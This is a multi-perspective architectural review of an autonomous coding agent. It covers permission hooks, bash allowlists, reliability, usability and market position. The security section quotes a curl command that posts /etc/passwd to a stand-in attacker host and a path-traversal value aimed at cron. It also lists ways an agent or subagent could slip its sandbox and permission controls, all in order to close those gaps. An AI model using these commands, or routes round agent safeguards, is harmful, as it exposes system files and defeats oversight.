# Autonomous Coder v3 — Five Independent Architectural Critiques

> Each critique is written from an independent perspective with no knowledge of the others.
> Each identifies strengths, weaknesses, and proposes concrete improvements.

---

## Critique 1: Security Reviewer

**Perspective**: A security engineer auditing the architecture for vulnerabilities, attack surface, and defense-in-depth adequacy.

### Strengths

1. **Three-layer defense in depth.** The architecture correctly layers PreToolUse hooks, permission mode, and `can_use_tool` callback. No single bypass defeats all three layers.

2. **Bash allowlist approach.** Denying by default and allowlisting specific commands is the correct security posture. The `DANGEROUS_PATTERNS` list catches common destructive commands.

3. **Subagent tool restriction.** The code-reviewer subagent is read-only (`Read`, `Grep`, `Glob`). This is correct — a compromised reviewer cannot write malicious code.

4. **`interrupt=False` on deny.** The `PermissionResultDeny` uses `interrupt=False`, which means a denied command doesn't kill the entire session. This is operationally correct — Claude retries with an allowed command.

### Weaknesses

**W1: The bash allowlist is too permissive.**
The list includes `curl`, `docker`, `git`, `kill`, `find`, and `node`. Each of these is a vector:
- `curl` can exfiltrate data: `curl -X POST https://evil.com -d @/etc/passwd`
- `docker run` can escape the sandbox entirely
- `git push` can push to arbitrary remotes with credentials
- `node -e` can execute arbitrary JavaScript
- `kill` can kill arbitrary processes

**Proposed fix:** Add argument validation for dangerous-but-necessary commands, similar to the quickstart's `validate_pkill_command()` pattern. Specifically:
```python
COMMANDS_REQUIRING_ARG_VALIDATION = {
    "curl": validate_curl,      # Block --data with external URLs
    "docker": validate_docker,  # Only allow `docker build`, `docker run` with restrictions
    "git": validate_git,        # Block `git push` to non-origin remotes
    "node": validate_node,      # Block `node -e` and `node --eval`
    "kill": validate_kill,      # Only allow killing dev-related PIDs
}
```

**W2: The security-auditor subagent has Bash access.**
A compromised or hallucinating security-auditor subagent could run arbitrary commands. The architecture gives it Bash access "to verify security properties" but this creates a privilege escalation path. Subagents inherit parent MCP servers AND the parent's `can_use_tool` callback applies to subagents, but the hooks do NOT automatically propagate to subagents. The SDK docs say "Subagents do not automatically inherit parent agent permissions" for hooks.

**Proposed fix:** Remove Bash from the security-auditor. If it needs to run commands, give it a restricted custom MCP tool (`run_security_check`) that only executes pre-approved verification commands.

**W3: `file_scope_guard` hook is described but not implemented.**
The architecture mentions this hook but shows an empty implementation (`return {}`). Without it, Claude can write to files outside the project directory using absolute paths.

**Proposed fix:** Implement the guard fully:
```python
async def file_scope_guard(input_data, tool_use_id, context):
    file_path = input_data["tool_input"].get("file_path", "")
    resolved = Path(file_path).resolve()
    if not str(resolved).startswith(str(PROJECT_PATH.resolve())):
        return {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": f"Write outside project: {file_path}",
            }
        }
    return {}
```

**W4: No secret detection in tool outputs.**
The `PostToolUse` audit_logger records tool calls but doesn't scan outputs. If Claude reads a `.env` file or a tool returns credentials in output, those secrets could end up in findings files or session state.

**Proposed fix:** Add a `PostToolUse` hook that scans tool results for common secret patterns (API keys, tokens, passwords) and redacts them before they propagate.

**W5: Custom MCP tools write to disk without validation.**
`save_findings` writes arbitrary content to `.autonomous-coder/findings/`. If Claude is tricked into saving malicious content (e.g., a script that gets executed later), this becomes a persistence vector. The `category` parameter is user-controlled and could contain path traversal (`../../etc/cron.d/malicious`).

**Proposed fix:** Validate the `category` parameter against an enum of allowed values:
```python
ALLOWED_CATEGORIES = {"research", "exploration", "plan", "implementation", "review"}
if category not in ALLOWED_CATEGORIES:
    return {"content": [{"type": "text", "text": f"Invalid category: {category}"}]}
```

### Verdict

The security architecture is **good but incomplete**. The three-layer defense is sound in principle, but the bash allowlist is over-permissive, one hook is unimplemented, and there are gaps in output scanning and input validation. The fixes are straightforward.

**Risk Rating: MEDIUM.** The architecture has the right structure; it needs tighter implementation.

---

## Critique 2: Production Operations Engineer

**Perspective**: An SRE evaluating the architecture for reliability, observability, failure modes, and operational readiness.

### Strengths

1. **Session resumption.** The `resume` parameter plus `SessionState` persistence means crashed sessions can be recovered. This is essential for long-running tasks that cost real money.

2. **`enable_file_checkpointing=True`.** SDK-level file state recovery handles the case where Claude partially writes a file before crashing.

3. **PreCompact hook.** The `auto_save_context` hook is a clever use of the SDK lifecycle — it injects a system message telling Claude to save findings before context compaction. This is much better than v2's "hope for the best" approach.

4. **SDK-native budget enforcement.** `max_budget_usd` means the session WILL stop when budget is exceeded. No manual tracking that might have bugs.

5. **Audit trail.** Every tool call is logged via `PostToolUse` hook with timestamp and relevant details.

### Weaknesses

**W1: Single point of failure — the ClaudeSDKClient process.**
The entire session is a single Python process running a single SDK client. If the process crashes (OOM, segfault, Python bug), ALL state beyond saved findings is lost. There is no process supervisor, no watchdog, no heartbeat.

**Proposed fix:** Add a lightweight process supervisor:
```python
# In __main__.py
MAX_RETRIES = 3
for attempt in range(MAX_RETRIES):
    try:
        result = asyncio.run(manager.run(task))
        break
    except (ConnectionError, ProcessError) as e:
        if attempt < MAX_RETRIES - 1:
            config.resume_session_id = load_last_session_id()
            print(f"Session crashed, resuming (attempt {attempt + 2}/{MAX_RETRIES})")
        else:
            raise
```

**W2: MCP server lifecycle is fire-and-forget.**
The architecture starts Serena and Context7 as subprocess MCP servers but doesn't monitor them. If Serena crashes mid-session, Claude gets cryptic MCP errors instead of a clear "Serena unavailable, switching to Read/Grep fallback."

**Proposed fix:** Use `client.get_mcp_status()` periodically (e.g., in a `PostToolUse` hook that checks every N tool calls) and log warnings if any server is unhealthy. Consider adding `client.remove_mcp_server()` + graceful degradation for non-critical servers.

**W3: No timeout on the overall session.**
`max_budget_usd` caps spend, but a session could run indefinitely if Claude gets stuck in a loop (e.g., repeatedly trying a failing command). There's no wall-clock timeout.

**Proposed fix:** Add `max_turns` as a safety cap (e.g., 200 turns) alongside the budget limit. Also consider a wall-clock timeout at the Python level:
```python
try:
    async with asyncio.timeout(config.max_duration_seconds or 3600):
        result = await process_stream(client, handler)
except TimeoutError:
    await client.interrupt()
    handler.on_complete(result=None, success=False)
```

**W4: Findings files have no size limit.**
`save_findings` writes arbitrary-length content. Claude could dump its entire context (hundreds of KB) into a findings file, then `get_findings` reads it all back, consuming context window. There's no size guard.

**Proposed fix:** Cap findings size at write time and return a truncation warning:
```python
MAX_FINDINGS_SIZE = 50_000  # chars
if len(content) > MAX_FINDINGS_SIZE:
    content = content[:MAX_FINDINGS_SIZE] + "\n\n[TRUNCATED at 50,000 chars]"
```

**W5: No structured observability beyond audit log.**
The audit log is an in-memory list of dicts. It's not exported, not persisted, and not queryable. For production use, this needs to be a real observability pipeline (structured logs, metrics, traces).

**Proposed fix:** At minimum, persist the audit log to `.autonomous-coder/audit.jsonl` on session completion. For production, emit OpenTelemetry spans or structured logs to stdout.

**W6: `PROGRESS_STATE` is a global mutable dict.**
The `report_progress` tool writes to a module-level global. This is not thread-safe and makes testing impossible.

**Proposed fix:** Pass progress state via closure or dependency injection:
```python
def create_findings_server(project_path: Path, on_progress: Callable) -> Any:
    progress_state = {}

    @tool("report_progress", ...)
    async def report_progress(args):
        progress_state[args["phase"]] = {"status": args["status"], "detail": args["detail"]}
        on_progress(args["phase"], args["status"], args["detail"])
        return ...
```

### Verdict

The architecture is **operationally viable but not production-hardened**. The resumption mechanism and PreCompact hook are genuinely good ideas. The gaps are around process supervision, MCP health monitoring, resource limits, and observability maturity. These are all fixable without architectural changes.

**Production Readiness: 6/10.** Needs timeout, size limits, process supervision, and structured logging.

---

## Critique 3: Developer Experience (DX) Reviewer

**Perspective**: A developer evaluating the architecture for ease of use, learnability, error messaging, extensibility, and day-to-day ergonomics.

### Strengths

1. **Simple mental model.** "One session, one task, start to finish." This is dramatically simpler than v2's "four-phase pipeline with separate sessions and truncated inter-phase context." A developer can understand the whole system in minutes.

2. **Two-command operation.** `autonomous-coder "Add auth"` for new tasks, `autonomous-coder --resume` for continuing. No configuration required for the common case.

3. **TOML configuration.** Project-level `.autonomous-coder.toml` is human-readable and doesn't require Python knowledge to configure. Adding extra MCP servers or allowed commands is straightforward.

4. **EventHandler protocol.** The protocol-based UI abstraction means someone can build a VS Code extension, a web UI, or a Jupyter widget by implementing 7 methods. Clean separation of concerns.

5. **Progress visibility.** The `report_progress` tool means the user always knows what phase Claude is in. The CLI adapter shows simple `[OK] explore: Found 12 routes` output. No black-box waiting.

### Weaknesses

**W1: No interactive mode.**
The architecture is purely fire-and-forget: you give it a task, it runs to completion. There's no way to:
- Answer Claude's questions mid-session
- Provide clarification when Claude is confused
- Approve/reject a plan before implementation begins
- Redirect Claude if it's going down the wrong path

The `ClaudeSDKClient` supports multi-turn conversations via `query()` after `receive_response()` completes. The architecture doesn't expose this.

**Proposed fix:** Add an interactive mode where the CLI blocks after the Plan phase and shows the plan for user approval:
```python
# After plan phase (detected via report_progress hook)
if config.interactive:
    plan_content = (FINDINGS_DIR / "plan.md").read_text()
    print(plan_content)
    approval = input("\nProceed with implementation? [y/n/edit]: ")
    if approval == "n":
        await client.interrupt()
    elif approval == "edit":
        feedback = input("Provide feedback: ")
        await client.query(f"Revise the plan based on this feedback: {feedback}")
```

**W2: Error messages are opaque.**
When things go wrong (MCP server fails to start, API key missing, session resume fails), the user sees raw Python exceptions. There are no user-friendly error messages or troubleshooting hints.

**Proposed fix:** Wrap common failure modes:
```python
class AutonomousCoderError(Exception):
    """Base error with user-friendly message and remediation hint."""
    def __init__(self, message: str, hint: str):
        super().__init__(message)
        self.hint = hint

# Usage:
if not (project_path / ".autonomous-coder" / "session.json").exists():
    raise AutonomousCoderError(
        "No previous session found to resume.",
        "Run 'autonomous-coder \"your task\"' to start a new session first.",
    )
```

**W3: No dry-run / plan-only mode.**
Sometimes you want Claude to research and plan but NOT implement. The architecture has no way to stop after planning. The `permission_mode="plan"` in the SDK is for read-only mode, not for "plan then stop."

**Proposed fix:** Add `--plan-only` flag that modifies the system prompt to stop after Phase 3 and report the plan without implementing:
```
# Added to system prompt when --plan-only:
STOP after Phase 3 (Plan). Do NOT proceed to implementation.
Present the complete plan and then finish.
```

**W4: No progress persistence across sessions.**
The `report_progress` tool writes to in-memory state. If the user closes the terminal and comes back, they can't see what progress was made. The `--resume` flag starts a new session but doesn't show previous progress.

**Proposed fix:** Persist progress state alongside findings:
```python
progress_path = FINDINGS_DIR / "progress.json"
progress_path.write_text(json.dumps(PROGRESS_STATE, indent=2))
```
And show it on startup:
```
$ autonomous-coder --resume
Previous session progress:
  [OK] research: Found jsonwebtoken + passport-jwt
  [OK] explore: Found 12 routes, 3 middleware layers
  [OK] plan: 5-step plan ready
  [..] implement: Step 3 of 5 (interrupted)
Resuming from step 3...
```

**W5: No way to customize the workflow.**
The phases (research → explore → plan → implement → review) are hardcoded in the system prompt. A user who wants to skip research, or add a "deploy" phase, or run review before implementation, has no configuration knob.

**Proposed fix:** Make phases configurable via TOML:
```toml
[workflow]
phases = ["explore", "plan", "implement"]  # Skip research and review
```
Then inject only the enabled phases into the system prompt.

**W6: TUI is described but underspecified.**
The architecture mentions a TUI option (`--tui`) but the `app.py` is listed as ~150 lines with no design detail. For the TUI to be useful, it needs at minimum: scrollable output, phase indicator, cost display, and keyboard shortcuts.

**Proposed fix:** Either commit to the TUI with a full design (like v2's Textual app) or defer it entirely and ship CLI-only. The current "~150 lines, figure it out later" approach will produce a half-baked TUI.

### Verdict

The DX is **strong for the common case, weak for the power-user case**. The simple fire-and-forget model works well for "here's a task, go do it." But the lack of interactive mode, plan-only mode, and workflow customization limits the architecture to a narrow use case. The fixes are additive — they don't require rearchitecting.

**DX Rating: 7/10.** Great out-of-box experience, needs knobs for advanced usage.

---

## Critique 4: Architecture Purist

**Perspective**: A software architect evaluating the design for principles adherence (SOLID, KISS, DRY, separation of concerns), testability, and long-term maintainability.

### Strengths

1. **Radical simplification.** v3 removes 500+ lines of code (orchestrator, base classes, phase runners, message types) by letting the SDK and Claude handle what they're designed to handle. This is KISS and YAGNI at its best.

2. **Protocol-based abstraction.** `EventHandler` as a Python Protocol is the right choice — structural typing, no inheritance hierarchy, easy to implement, testable.

3. **Composition over inheritance.** v2 had `BasePhaseRunner` → `ResearchPhaseRunner` etc. v3 has no class hierarchy. `SessionManager` composes `EventHandler`, config, and SDK client through constructor injection.

4. **Single composition root.** `session.py` is the only place where all components are wired together. This makes the dependency graph clear and the system easy to reason about.

5. **Correct SDK usage.** The architecture uses `ClaudeSDKClient` (streaming mode) as the SDK documentation recommends, with proper `async with` context management.

### Weaknesses

**W1: Global mutable state in `tools.py`.**
`FINDINGS_DIR` and `PROGRESS_STATE` are module-level globals mutated by `create_findings_server()`. This violates the principle of explicit dependencies, makes testing impossible (can't run two sessions in the same process), and creates race conditions in concurrent scenarios.

**Proposed fix:** Encapsulate findings state in a class:
```python
class FindingsStore:
    def __init__(self, project_path: Path):
        self.dir = project_path / ".autonomous-coder" / "findings"
        self.progress: dict[str, dict] = {}

    async def save(self, category: str, content: str) -> str: ...
    async def load(self, category: str) -> str: ...
    def report(self, phase: str, status: str, detail: str) -> None: ...
```

Then create the MCP tools as closures over the instance. The `@tool` decorator and `create_sdk_mcp_server` support this pattern via factory functions.

**W2: The system prompt is doing too many things.**
The `ORCHESTRATOR_SYSTEM_PROMPT` defines: workflow phases, tool usage guidelines, budget awareness, security constraints, subagent delegation rules, AND output format. This is a single 2000+ character string that's hard to test, hard to iterate on, and hard to version.

**Proposed fix:** Break the system prompt into composable sections:
```python
def build_system_prompt(project_state: dict, config: SessionConfig) -> str:
    sections = [
        ROLE_PREAMBLE,
        format_project_state(project_state),
        WORKFLOW_INSTRUCTIONS,
        TOOL_GUIDELINES,
        SUBAGENT_DELEGATION,
        SECURITY_CONSTRAINTS,
    ]
    return "\n\n".join(sections)
```

Each section can be tested independently and swapped for different use cases.

**W3: `detect.py` is too simple to be a separate module.**
The architecture allocates an entire module for greenfield-vs-existing detection, estimated at 40 lines. This is one function that returns a dict. It doesn't warrant its own module.

**Proposed fix:** Inline it into `session.py` as a private function, or if it grows, add it to `config.py`.

**W4: The streaming processor couples message types to processing logic.**
`process_stream()` uses `isinstance` checks against SDK types (`StreamEvent`, `AssistantMessage`, `ResultMessage`). If the SDK adds new message types or changes the event structure, this function breaks silently (unhandled messages are dropped).

**Proposed fix:** Add a catch-all branch with logging:
```python
else:
    logger.debug(f"Unhandled message type: {type(msg).__name__}")
```
And consider using `match` statement (Python 3.10+) for exhaustiveness:
```python
match msg:
    case StreamEvent(): ...
    case AssistantMessage(): ...
    case ResultMessage(): ...
    case _: logger.warning(f"Unknown: {type(msg)}")
```

**W5: No clear boundary between "what Python controls" and "what Claude controls."**
The architecture says "Python controls session lifecycle, Claude orchestrates phases" but the boundary is implicit. When should Python step in? What happens if Claude ignores the system prompt and skips phases? There's no programmatic enforcement of the workflow.

**Proposed fix:** This is actually fine for v3. The architecture correctly identifies that rigid phase enforcement is over-engineering. But document the boundary explicitly:
```
Python controls: session start/stop, security gates, budget limits, UI rendering
Claude controls: phase ordering, tool selection, subagent delegation, implementation strategy
```
If phase enforcement becomes necessary later, it can be added via `PostToolUse` hooks that track `save_findings` calls and inject system messages if phases are skipped.

**W6: Testing strategy is undefined.**
The architecture document says "no mocks, stubs, or test files" (following the project mandate) but doesn't describe how the system is validated. How do you know `security_gate` actually blocks dangerous commands? How do you know `process_stream` correctly routes all event types?

**Proposed fix:** Define the functional validation strategy:
- Security: Run the system with deliberately dangerous prompts and verify blocks appear in audit log
- Streaming: Run a real session and verify CLI output matches expected format
- Resumption: Kill a running session (SIGTERM), resume, verify findings are recovered
- Budget: Set `max_budget_usd=0.10` and verify session stops within budget

### Verdict

The architecture is **clean, minimal, and correctly factored** for its scope. The main issues are the global mutable state (fixable) and the monolithic system prompt (improvable). The simplification from v2 is the right move — removing 500 lines of unnecessary abstraction while gaining SDK-native capabilities.

**Architecture Quality: 8/10.** Clean composition, correct abstractions, minor state management issues.

---

## Critique 5: Competitive Analyst

**Perspective**: A product strategist comparing this architecture to competing autonomous coding tools (Claude Code, Cursor, Aider, OpenHands/Devin, Codex CLI) and evaluating its market position.

### Strengths

1. **Full autonomy with structured output.** Unlike Claude Code (which requires user interaction) or Cursor (which is editor-centric), autonomous-coder runs start-to-finish without human input. The `report_progress` tool provides structured visibility into what's happening.

2. **Compaction-safe memory.** The `save_findings`/`get_findings` pattern is unique. Aider and Claude Code both lose context during long sessions. The PreCompact hook is a genuine innovation.

3. **Multi-phase structured workflow.** Most competitors (Aider, Codex CLI) treat coding as a single-shot operation. The research → explore → plan → implement → review pipeline produces higher-quality results for complex tasks because Claude understands the problem before modifying code.

4. **SDK-native architecture.** Built on the official Claude Agent SDK rather than wrapping the API directly. This means automatic access to new SDK features (better streaming, new hook events, improved subagent capabilities) without architectural changes.

5. **Two entry paths.** Supporting both greenfield and existing-project workflows makes this tool useful for more scenarios than competitors that assume an existing codebase (Aider, Cursor).

### Weaknesses

**W1: No editor integration.**
Cursor integrates into VS Code. GitHub Copilot Agent Mode runs in the editor. autonomous-coder is a standalone CLI tool. Most developers live in their editor and won't switch to a separate terminal for coding tasks.

**Proposed fix:** Design the `EventHandler` protocol to support LSP-like communication:
```python
class LspEventHandler(EventHandler):
    """EventHandler that communicates over JSON-RPC for editor extensions."""
    def __init__(self, transport: Transport): ...
```
Then build a VS Code extension that launches `autonomous-coder` as a subprocess and renders its events in the editor.

**W2: No diff preview or approval workflow.**
Cursor and Claude Code show diffs before applying them. autonomous-coder runs with `permission_mode="acceptEdits"` — it modifies files without showing the user what's changing. For production codebases, this is terrifying.

**Proposed fix:** Add a `--confirm-edits` mode that uses `permission_mode="default"` and surfaces `PermissionRequest` hook events to the user:
```python
async def permission_prompt(input_data, tool_use_id, context):
    tool_name = input_data["tool_name"]
    tool_input = input_data["tool_input"]
    if tool_name in ("Write", "Edit"):
        # Show diff to user, wait for approval
        approval = await handler.request_approval(tool_name, tool_input)
        decision = "allow" if approval else "deny"
        return {"hookSpecificOutput": {"hookEventName": "PermissionRequest", "permissionDecision": decision}}
    return {}
```

**W3: No git integration.**
Aider creates commits automatically with meaningful messages. Claude Code manages git operations. autonomous-coder doesn't mention git at all — it modifies files but doesn't commit, branch, or push. This means the user has no undo beyond `git checkout .`.

**Proposed fix:** Add a git integration phase or system prompt instruction:
```
After completing implementation:
1. Stage only the files you modified: git add <specific files>
2. Create a commit with a descriptive message: git commit -m "<type>: <description>"
3. Do NOT push — let the user review first
```
And add `git` to the system prompt's available tools section.

**W4: Single-model, single-provider lock-in.**
The architecture hardcodes `claude-opus-4-6` and the Claude Agent SDK. Competitors like Aider support GPT-4, Claude, Gemini, and local models. autonomous-coder is entirely dependent on Anthropic's API availability and pricing.

**Response:** This is an intentional trade-off. The Claude Agent SDK provides capabilities (hooks, subagents, MCP, streaming) that multi-provider wrappers can't match. The depth of integration with one SDK beats shallow integration with many. However, if Anthropic has an outage, autonomous-coder is completely down.

**W5: No incremental/iterative mode.**
Devin and OpenHands support ongoing projects where the agent makes incremental improvements over many sessions, maintaining project context across days or weeks. autonomous-coder treats each session as independent (with limited resume support).

**Proposed fix:** The `save_findings` mechanism already provides the foundation. Add a `--continue` mode that loads ALL previous findings as context for the new task:
```python
if config.continue_from_previous:
    existing = load_all_findings(FINDINGS_DIR)
    initial_prompt += f"\n\nPrevious session findings:\n{existing}"
```
This leverages the 1M context window — load previous exploration and plan results to skip redundant phases.

**W6: No cost estimation before execution.**
The user sets a budget limit but has no idea if their task will cost $0.50 or $50.00 before it runs. Competitors like Aider show token counts per interaction.

**Proposed fix:** Add a `--estimate` flag that runs only the plan phase and estimates token usage:
```
$ autonomous-coder --estimate "Add JWT authentication"
Estimated:
  Research: ~10K tokens ($0.15)
  Explore:  ~20K tokens ($0.30)
  Plan:     ~5K tokens  ($0.08)
  Implement: ~50K tokens ($0.75)
  Review:   ~10K tokens ($0.15)
  Total:    ~95K tokens (~$1.43)
  Budget limit: $5.00 [OK]
Proceed? [y/n]
```

### Verdict

autonomous-coder v3 occupies a **genuine niche**: fully autonomous, multi-phase coding with structured progress and compaction-safe memory. No competitor does all three simultaneously. However, the lack of editor integration, diff preview, and git integration limits adoption to power users comfortable with CLI tools.

**Competitive Position: NICHE LEADER.** Strong in its specific lane (autonomous CLI coding), but needs editor integration and diff preview to compete for mainstream adoption.

**Recommended Priority for Competitive Parity:**
1. Git integration (low effort, high value)
2. Diff preview / `--confirm-edits` mode (medium effort, high value)
3. Cost estimation (low effort, medium value)
4. Editor integration (high effort, high value for adoption)
5. Incremental project mode (medium effort, medium value)

---

## Cross-Critique Synthesis

Issues raised by multiple critics (highest priority):

| Issue | Raised By | Fix Complexity |
|---|---|---|
| Global mutable state (`PROGRESS_STATE`, `FINDINGS_DIR`) | Security (#5), Architecture (#W1), Operations (#W6) | Low |
| Missing `file_scope_guard` implementation | Security (#W3) | Low |
| No interactive/approval mode | DX (#W1), Competitive (#W2) | Medium |
| Over-permissive bash allowlist | Security (#W1) | Medium |
| No session timeout | Operations (#W3) | Low |
| Findings size limits | Operations (#W4) | Low |
| No git integration | Competitive (#W3) | Low |

**Top 3 fixes to implement before shipping:**
1. Fix global mutable state → use `FindingsStore` class with dependency injection
2. Implement `file_scope_guard` fully → path resolution + project boundary check
3. Add `max_turns` + wall-clock timeout → safety caps for runaway sessions
